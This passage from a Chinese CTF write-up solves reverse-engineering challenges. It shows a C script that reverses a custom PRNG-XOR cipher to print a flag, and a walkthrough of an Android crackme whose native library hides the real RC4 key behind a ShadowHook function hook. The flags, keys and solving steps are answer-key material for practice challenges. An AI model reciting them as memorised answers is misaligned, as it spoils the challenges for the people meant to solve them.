class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cipher[<span class="number">128</span>] = &#123;</span><br><span class="line">    <span class="number">0xCD</span>, <span class="number">0xC7</span>, <span class="number">0xE2</span>, <span class="number">0x86</span>, <span class="number">0x3A</span>, <span class="number">0x19</span>, <span class="number">0xB9</span>, <span class="number">0xB6</span>, <span class="number">0xF1</span>, <span class="number">0x81</span>, <span class="number">0x45</span>, <span class="number">0xB4</span>, <span class="number">0xB6</span>, <span class="number">0xE5</span>, <span class="number">0x0D</span>, <span class="number">0xD4</span>, </span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0xA6</span>, <span class="number">0xD3</span>, <span class="number">0xF7</span>, <span class="number">0x33</span>, <span class="number">0x5D</span>, <span class="number">0x5F</span>, <span class="number">0x09</span>, <span class="number">0x95</span>, <span class="number">0xAF</span>, <span class="number">0x9A</span>, <span class="number">0xBE</span>, <span class="number">0x89</span>, <span class="number">0xEA</span>, <span class="number">0x54</span>, <span class="number">0x71</span>, </span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0xC6</span>, <span class="number">0x8B</span>, <span class="number">0x84</span>, <span class="number">0x05</span>, <span class="number">0x14</span>, <span class="number">0xBB</span>, <span class="number">0x41</span>, <span class="number">0xDD</span>, <span class="number">0x34</span>, <span class="number">0x91</span>, <span class="number">0x1B</span>, <span class="number">0x21</span>, <span class="number">0x83</span>, <span class="number">0xDE</span>, <span class="number">0x15</span>, </span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x22</span>, <span class="number">0x8A</span>, <span class="number">0xE1</span>, <span class="number">0xBD</span>, <span class="number">0x33</span>, <span class="number">0x4D</span>, <span class="number">0x7E</span>, <span class="number">0xD2</span>, <span class="number">0xA3</span>, <span class="number">0xA9</span>, <span class="number">0x12</span>, <span class="number">0xF1</span>, <span class="number">0xE9</span>, <span class="number">0x88</span>, <span class="number">0x60</span>, </span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0xE6</span>, <span class="number">0xAB</span>, <span class="number">0x54</span>, <span class="number">0xCF</span>, <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x6B</span>, <span class="number">0x6B</span>, <span class="number">0xBA</span>, <span class="number">0x26</span>, <span class="number">0x09</span>, <span class="number">0xFB</span>, <span class="number">0x10</span>, <span class="number">0x97</span>, <span class="number">0xDF</span>, </span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xBF</span>, <span class="number">0xCC</span>, <span class="number">0xE7</span>, <span class="number">0xB0</span>, <span class="number">0x42</span>, <span class="number">0xE5</span>, <span class="number">0x32</span>, <span class="number">0x4C</span>, <span class="number">0x0F</span>, <span class="number">0xE0</span>, <span class="number">0x60</span>, <span class="number">0x47</span>, <span class="number">0xD0</span>, <span class="number">0x5A</span>, <span class="number">0xE8</span>, </span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xAE</span>, <span class="number">0x74</span>, <span class="number">0x4D</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0xB3</span>, <span class="number">0xD2</span>, <span class="number">0xDE</span>, <span class="number">0x1B</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x7A</span>, <span class="number">0x03</span>, <span class="number">0x67</span>, <span class="number">0xCF</span>, </span><br><span class="line">    <span class="number">0xF0</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x49</span>, <span class="number">0x9A</span>, <span class="number">0xE0</span>, <span class="number">0xC2</span>, <span class="number">0x3B</span>, <span class="number">0x51</span>, <span class="number">0x63</span>, <span class="number">0xFF</span>, <span class="number">0x84</span>, <span class="number">0x60</span>, <span class="number">0x5B</span>, <span class="number">0xC1</span>, <span class="number">0x8E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">size_t</span> len = <span class="built_in">sizeof</span>(cipher);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mt[<span class="number">128</span>];</span><br><span class="line"><span class="type">short</span> index1; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mysrand</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 *result;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  mt[<span class="number">0</span>] = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">0x71</span>; ++i )</span><br><span class="line">    mt[i] = (<span class="number">0xA7A25365</span> * (mt[i - <span class="number">1</span>] ^ ((<span class="type">unsigned</span> <span class="type">int</span>)mt[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>)) + i) ^ <span class="number">0x56</span>;</span><br><span class="line">  result = &amp;index1;</span><br><span class="line">  index1 = <span class="number">114</span>;</span><br><span class="line">  <span class="keyword">return</span> *result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">myrand</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5;</span><br><span class="line"></span><br><span class="line">  v1 = (<span class="type">unsigned</span> __int16)index1;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)index1 &gt; <span class="number">0x71u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x71</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = (mt[i] &amp; <span class="number">0x80000</span> | mt[(i + <span class="number">1</span>) % <span class="number">0x72</span>] &amp; <span class="number">0x7FFFFu</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (mt[(i + <span class="number">1</span>) % <span class="number">0x72</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        v3 ^= <span class="number">0x8908B0DF</span>;</span><br><span class="line">      mt[i] = mt[(i + <span class="number">514</span>) % <span class="number">0x72</span>] ^ v3;</span><br><span class="line">    &#125;</span><br><span class="line">    index1 = <span class="number">0</span>;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = mt[v1];</span><br><span class="line">  index1 = v1 + <span class="number">1</span>;</span><br><span class="line">  v5 = v4 ^ (v4 &gt;&gt; <span class="number">11</span>) ^ ((v4 ^ (v4 &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9D2C5680</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 ^ (v5 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xEFC60000</span> ^ ((v5 ^ (v5 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xEFC60000</span>) &gt;&gt; <span class="number">18</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> seed = <span class="number">114514</span>;</span><br><span class="line">    <span class="built_in">mysrand</span>(seed);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> decrypted[len + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(decrypted, <span class="number">0</span>, len + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        decrypted[i] = cipher[i] ^ <span class="built_in">myrand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted input: %s\n&quot;</span>, decrypted);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行得到flag：<font color=deepskyblue><strong>flag{R4ndom_rand0m_happy_Funnny_R4ndom_1s_r3ally_funNy!!_hhh233HHH_this_1s_just_a_pi3ce_of_sh1t_fffkkkkkk_f4ck_jjjjKKKKKjjjjasd}</strong></font>.</p>
<h2 id="simple："><a href="#simple：" class="headerlink" title="simple："></a>simple：</h2><p>先在java层找到验证函数逻辑：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CheckActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ActivityCheckBinding binding;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">CheckData</span><span class="params">(String str)</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;check&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (CheckActivity.class) &#123;</span><br><span class="line">            ShadowHook.init();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        init();</span><br><span class="line">        <span class="built_in">this</span>.binding = ActivityCheckBinding.inflate(getLayoutInflater());</span><br><span class="line">        setContentView(<span class="built_in">this</span>.binding.getRoot());</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.check2;</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.example.simpleandroid.CheckActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> CheckActivity.<span class="built_in">this</span>.binding.inputFlag2;</span><br><span class="line">                editText.setFilters(<span class="keyword">new</span> <span class="title class_">InputFilter</span>[]&#123;<span class="keyword">new</span> <span class="title class_">InputFilter</span>.LengthFilter(<span class="number">30</span>)&#125;);</span><br><span class="line">                <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> editText.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (CheckActivity.<span class="built_in">this</span>.isValidInput(input) &amp;&amp; CheckActivity.<span class="built_in">this</span>.CheckData(input)) &#123;</span><br><span class="line">                    Toast.makeText(CheckActivity.<span class="built_in">this</span>, <span class="string">&quot;You are right&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(CheckActivity.<span class="built_in">this</span>, <span class="string">&quot;You are wrong&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidInput</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> input.startsWith(<span class="string">&quot;flag&#123;&quot;</span>) &amp;&amp; input.endsWith(<span class="string">&quot;&#125;&quot;</span>) &amp;&amp; input.length() == <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现flag长度为32，查看libcheck.so内的加密逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1C430</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [xsp+18h] [xbp-58h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *StringUTFChars; <span class="comment">// [xsp+20h] [xbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// [xsp+44h] [xbp-2Ch]</span></span><br><span class="line">  _QWORD v9[<span class="number">5</span>]; <span class="comment">// [xsp+48h] [xbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v9[<span class="number">4</span>] = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  sub_1C010();							<span class="comment">//一个hook函数</span></span><br><span class="line">  StringUTFChars = (<span class="type">const</span> <span class="type">char</span> *)_JNIEnv::GetStringUTFChars(a1, a3);</span><br><span class="line">  sub_1C078((__int64)v9, StringUTFChars, (<span class="type">unsigned</span> __int8 *)kk);			<span class="comment">//魔改RC4</span></span><br><span class="line">  eee[<span class="number">0</span>] = <span class="number">0xCD8413F20B6FCE4CL</span>L;</span><br><span class="line">  eee[<span class="number">1</span>] = <span class="number">0x5C9B1B43933043CFL</span>L;</span><br><span class="line">  eee[<span class="number">2</span>] = <span class="number">0x1C6EB6E1A546128EL</span>L;</span><br><span class="line">  eee[<span class="number">3</span>] = <span class="number">0x77C6E3D7AE009A3EL</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v9[i] != eee[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars);</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">  _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现加密是一个自定义的魔改RC4，密钥为<font color=red><strong>this_is_a_key</strong></font>，且密文也已知，但在RC4上方还有一个hook函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1C010</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line"></span><br><span class="line">  result = shadowhook_hook_sym_addr(sub_11073, sub_21345, <span class="number">0LL</span>);			<span class="comment">//调用sub11073时将其替换为sub21345</span></span><br><span class="line">  stub = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现这里替换了一个函数，查看sub_1C078：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1C078</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">unsigned</span> __int8 *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line">  __int64 v4; <span class="comment">// [xsp+8h] [xbp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [xsp+10h] [xbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [xsp+28h] [xbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [xsp+2Ch] [xbp-34h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [xsp+30h] [xbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// [xsp+36h] [xbp-2Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v10; <span class="comment">// [xsp+37h] [xbp-29h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  sub_11073(a3); <span class="comment">//函数逻辑在此被替换</span></span><br><span class="line">  result = __strlen_chk(a2, <span class="number">0xFFFFFFFFFFFFFFFFL</span>L);</span><br><span class="line">  v8 = result;</span><br><span class="line">  v7 = <span class="number">0</span>; <span class="comment">//存储8字节数量</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i ) <span class="comment">//魔改的PRGA部分</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = (v9 + ss[++v10]) % <span class="number">256</span>;</span><br><span class="line">    result = sub_1BC30(&amp;ss[v10], &amp;ss[v9]); <span class="comment">//swap</span></span><br><span class="line">    a2[i] ^= ss[(ss[v10] + ss[v9]) % <span class="number">256</span>];</span><br><span class="line">    *(_QWORD *)(a1 + <span class="number">8LL</span> * v7) = (<span class="type">unsigned</span> __int8)a2[i] | (*(_QWORD *)(a1 + <span class="number">8LL</span> * v7) &lt;&lt; <span class="number">8</span>); <span class="comment">//将加密后的字节按8字节块存储到a1</span></span><br><span class="line">    <span class="keyword">if</span> ( !((i + <span class="number">1</span>) % <span class="number">8</span>) &amp;&amp; i ) <span class="comment">//位移加密，每8个字节加密一次</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (rand() &amp; <span class="number">1</span>) != <span class="number">0</span> ) <span class="comment">//随机左或右移随机位</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = *(_QWORD *)(a1 + <span class="number">8LL</span> * v7);</span><br><span class="line">        result = rand();</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">8LL</span> * v7) ^= v5 &gt;&gt; ((<span class="type">int</span>)result % <span class="number">64</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = *(_QWORD *)(a1 + <span class="number">8LL</span> * v7);</span><br><span class="line">        result = rand();</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">8LL</span> * v7) ^= v4 &lt;&lt; ((<span class="type">int</span>)result % <span class="number">64</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ++v7;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看sub_21345：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_21345</span><span class="params">(<span class="type">unsigned</span> __int8 *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// x30</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *prev_func)(_BYTE *); <span class="comment">// [xsp+8h] [xbp-58h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+24h] [xbp-3Ch]</span></span><br><span class="line">  _BYTE v4[<span class="number">8</span>]; <span class="comment">// [xsp+30h] [xbp-30h] BYREF</span></span><br><span class="line">  _BYTE v5[<span class="number">13</span>]; <span class="comment">// [xsp+38h] [xbp-28h]</span></span><br><span class="line">  _BYTE v6[<span class="number">16</span>]; <span class="comment">// [xsp+48h] [xbp-18h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [xsp+58h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  ShadowhookStackScope::ShadowhookStackScope((ShadowhookStackScope *)v4, v1);</span><br><span class="line">  *(_QWORD *)&amp;v5[<span class="number">5</span>] = <span class="number">0x3C37311A241A312CL</span>L; <span class="comment">//真正的密钥，这是第6~13字节</span></span><br><span class="line">  *(_QWORD *)v5 = <span class="number">0x1A312C1A20332C02L</span>L; <span class="comment">//第1~8字节（有重叠）</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">12</span>; ++i ) <span class="comment">//密钥共计13字节</span></span><br><span class="line">    v6[i] = v5[i] ^ <span class="number">0x45</span>; <span class="comment">//异或0x45后是Give_it_a_try</span></span><br><span class="line">  prev_func = (<span class="type">void</span> (__fastcall *)(_BYTE *))shadowhook_get_prev_func(sub_11073); <span class="comment">//调用原来的sub_11073</span></span><br><span class="line">  prev_func(v6); <span class="comment">//但是传入了新的key</span></span><br><span class="line">  srand(<span class="number">0x159357u</span>); <span class="comment">//固定了随机数生成器的种子</span></span><br><span class="line">  ShadowhookStackScope::~ShadowhookStackScope((ShadowhookStackScope *)v4);</span><br><span class="line">  _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现这里使用了一个新的key：<font color=red><strong>Give_it_a_try</strong></font>来带入sub_11073，并初始化了随机数生成种子，查看sub_11073：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_11073</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// w9</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [xsp+24h] [xbp-13Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [xsp+28h] [xbp-138h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [xsp+2Ch] [xbp-134h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [xsp+30h] [xbp-130h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [xsp+34h] [xbp-12Ch]</span></span><br><span class="line">  _OWORD v8[<span class="number">16</span>]; <span class="comment">// [xsp+50h] [xbp-110h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [xsp+158h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i ) <span class="comment">//初始化S盒</span></span><br><span class="line">    ss[i] = i;</span><br><span class="line">  v5 = __strlen_chk(a1, <span class="number">0xFFFFFFFFFFFFFFFFL</span>L);</span><br><span class="line">  srand(<span class="number">0x217u</span>); <span class="comment">//这里固定的种子无效，被覆盖了</span></span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j ) <span class="comment">//密钥流生成</span></span><br><span class="line">    *((_BYTE *)v8 + j) = a1[j % v5];</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">255</span>; ++k ) <span class="comment">//KSA部分</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="type">unsigned</span> __int8)(v3 + ss[k] + *((_BYTE *)v8 + k));</span><br><span class="line">    <span class="keyword">if</span> ( v3 + ss[k] + *((<span class="type">unsigned</span> __int8 *)v8 + k) &lt;= <span class="number">0</span> )</span><br><span class="line">      v1 = -(<span class="type">unsigned</span> __int8)-(<span class="type">char</span>)(v3 + ss[k] + *((_BYTE *)v8 + k));</span><br><span class="line">    v3 = v1;</span><br><span class="line">    sub_1BC30(&amp;ss[k], &amp;ss[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
